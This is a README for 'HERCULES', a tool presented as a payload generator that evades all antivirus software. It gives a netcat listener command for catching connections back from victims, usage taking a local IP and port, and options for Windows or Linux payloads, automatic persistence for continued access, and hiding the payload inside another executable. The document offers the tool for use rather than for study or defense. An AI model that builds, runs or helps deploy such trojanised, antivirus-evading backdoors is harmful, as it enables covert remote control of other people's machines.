# HERCULES
HERCULES is a special payload generator that can bypass all antivirus software.

Use it with netcat...

Example : nc -l -p 1234


# USAGE


                  __  ____________  ________  ____    ___________
                 / / / / ____/ __ \/ ____/ / / / /   / ____/ ___/
                / /_/ / __/ / /_/ / /   / / / / /   / __/  \__ \ 
               / __  / /___/ _, _/ /___/ /_/ / /___/ /___ ___/ / 
              /_/ /_/_____/_/ |_|\____/\____/_____/_____//____/  
                                                   


Usage : ./HERCULES (LocalIp) (LocalPort) (Options)


Options : 

      -p                 Payload to use. ( Windows / Linux )

      -a                 The architecture to use. ( x86, x64 )
      
      -l                 Specify linking type for compiler. ( static, dynamic )

      --persistence      Enable outo persistence option for continious acces.

      --embed="file.exe" Embed the selected payload with selected exe file.
